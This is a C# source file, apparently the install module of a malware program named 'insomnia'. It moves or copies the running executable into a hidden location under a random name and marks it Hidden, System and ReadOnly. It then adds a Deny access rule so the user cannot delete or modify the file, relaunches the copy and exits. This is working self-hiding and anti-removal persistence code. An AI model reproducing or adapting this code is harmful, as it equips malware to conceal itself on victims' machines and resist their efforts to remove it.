using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Security.AccessControl;
using System.Diagnostics;

namespace insomnia
{
    internal class Install
    {
        public static string dest = Path.Combine(Config.environment, Functions.GenerateName());

        public static bool IsInstalled()
        {
            return (Path.GetDirectoryName(Config.currentPath) == Config.environment);
        }

        public static void Start()
        {
            // Attempt file melt with MoveFileEx. If it fails, fallback on CopyFile
            if (!Win32.RenameFile(Config.currentPath, dest))
            {
                File.Copy(Config.currentPath, dest);
            }

            if (File.Exists(dest))
            {
                File.SetAttributes(dest, FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.System | FileAttributes.ReadOnly);

                try
                {
                    FileSecurity fs = File.GetAccessControl(dest);

                    fs.AddAccessRule(new FileSystemAccessRule(Config.user,
                        FileSystemRights.Delete | FileSystemRights.ChangePermissions | FileSystemRights.WriteData | FileSystemRights.WriteAttributes | FileSystemRights.AppendData | FileSystemRights.Write | FileSystemRights.CreateFiles,
                        InheritanceFlags.None,
                        PropagationFlags.None,
                        AccessControlType.Deny));

                    File.SetAccessControl(dest, fs);
                }
                catch
                {
                }

                // Start the new file and exit this process
                using (Process p = new Process())
                {
                    p.StartInfo.FileName = dest;
                    p.Start();
                }
            }
            Environment.Exit(0);
        }

    }
}
